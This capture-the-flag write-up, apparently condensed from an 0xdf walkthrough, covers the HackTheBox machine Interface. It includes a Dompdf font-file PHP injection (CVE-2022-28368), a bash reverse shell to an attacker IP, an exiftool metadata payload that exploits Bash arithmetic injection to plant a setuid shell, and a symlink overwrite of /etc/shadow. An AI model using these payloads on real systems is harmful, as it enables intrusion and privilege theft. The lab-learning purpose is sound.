## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Medium](Medium)
- Platform: [HTB

### 💡 Summary
- Initial foothold via **Dompdf** file-write vulnerability (CVE-2022-28368) 📝
- RCE achieved through a poisoned font file + PHP shell 💥
- Privilege escalation through **arithmetic expression injection** in a Bash cleanup script 👑
- Alternative root path using symbolic links to overwrite `/etc/shadow` (patched) 🔒

---

## 🕵️ Recon

### 🔎 Nmap Scan
```bash
nmap -p- --min-rate 10000 10.10.11.200
nmap -p 22,80 -sCV 10.10.11.200
```
**Findings:**
- Open ports: `22` (SSH) and `80` (HTTP)
- Ubuntu 18.04
- Web server: nginx + Next.js (frontend React)

---

## 🌐 Web Enumeration

### Interface.htb
- Only shows "Site under maintenance" 🛠️
- Headers include: `X-Powered-By: Next.js`
- CSP reveals subdomain: `prd.m.rendering-api.interface.htb`

### Subdomain Discovery
```bash
ffuf -u http://10.10.11.200 -H "Host: FUZZ.interface.htb" -w subdomains-top1million-5000.txt --fs 6359
```

Add to `/etc/hosts`:
```
10.10.11.200 interface.htb prd.m.rendering-api.interface.htb
```

### prd.m.rendering-api.interface.htb
- Returns `File not found.` on `/`
- Directory brute force with feroxbuster reveals `/vendor` with `403`

### Deeper Enumeration
```bash
feroxbuster -u http://prd.m.rendering-api.interface.htb/vendor/
```
Reveals:
- `/vendor/dompdf`
- `/vendor/composer`

Suggests this is a **PHP app** using **dompdf** 🧾

---

## 🔍 API Discovery

### Brute Forcing `/api` endpoint
```bash
ffuf -u http://prd.m.rendering-api.interface.htb/FUZZ -w raft-medium-words.txt -mc all -fs 0
```
Finds `/api`, which returns:
```json
{"status":"404","status_text":"route not defined"}
```

Then brute force subroutes with POST:
```bash
ffuf -X POST -u http://prd.m.rendering-api.interface.htb/api/FUZZ -w raft-medium-words.txt -mc all -fs 50
```
Finds: `/api/html2pdf`

### PDF Generator (Dompdf)
- Vulnerable to CVE-2022-28368
- `html` parameter used to render user-supplied HTML to PDF

---

## 🎯 Initial Foothold via RCE

### Exploit Strategy:
1. Use **CSS `@font-face`** to reference a remote `.php` file pretending to be a font file
2. Inject PHP code inside font file comments
3. Trigger dompdf to cache the file on the server
4. Access the cached file directly to trigger the PHP shell

### Key Payloads
```php
@font-face {
  font-family:'exploitfont';
  src:url('http://<attacker-ip>/exploit_font.php');
}
```
```bash
echo -n "http://<attacker-ip>/exploit_font.php" | md5sum
# Use hash to build path:
/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_<hash>.php
```
Execute commands:
```bash
curl -s --data-urlencode 'cmd=id' http://target/fonts/exploitfont_normal_<hash>.php
```
Reverse shell:
```bash
cmd=bash -c "bash -i >& /dev/tcp/<attacker-ip>/443 0>&1"
```

Shell acquired as: `www-data`

---

## 🧱 Privilege Escalation - Arithmetic Expression Injection

### Enumeration with pspy
Reveals cron job:
```bash
/usr/local/sbin/cleancache.sh (every 2 min)
```
Script content:
```bash
meta_producer=$(exiftool -Producer "$file")
if [[ "$meta_producer" -eq "dompdf" ]]; then
  rm "$file"
fi
```

### Exploiting `-eq` with malicious Producer:
```bash
exiftool -Producer='x[$(touch${IFS}/tmp/rootshell)]' /tmp/testfile
```
Root-created `/tmp/rootshell` appears after 2 mins ✅

### Full Root Shell
```bash
exiftool -Producer='x[$(cp${IFS}/bin/bash${IFS}/tmp/bashroot;chmod${IFS}4777${IFS}/tmp/bashroot)]' /tmp/triggerfile
```
```bash
/tmp/bashroot -p
```

You are now root! 🎉

---

## 🔓 Beyond Root - Symbolic Link Abuse (Patched)

### Original cron:
```bash
cp /root/font_cache/dompdf_font_family_cache.php /var/www/.../fonts/dompdf_font_family_cache.php
chown www-data ...
```
### Exploit:
- Replace `dompdf_font_family_cache.php` with symlink to `/etc/shadow`
- Wait for cron to overwrite and change ownership
- Insert malicious root hash
- `su -` as root using new password 🔑

**Patched version** copies to safe path and chowns first, preventing symlink attacks 🛡️

---

## 📚 Learnings
- dompdf vulnerabilities and font injection are a valid RCE vector
- Bash's `[[ var -eq string ]]` quirks can be weaponized
- Cron jobs are powerful escalation opportunities when scripts are sloppy
- Symbolic links are dangerous when blindly used with root privileges

---

If you liked this write-up, check out more from [0xdf](https://0xdf.gitlab.io)! 🧠🖥️🍩

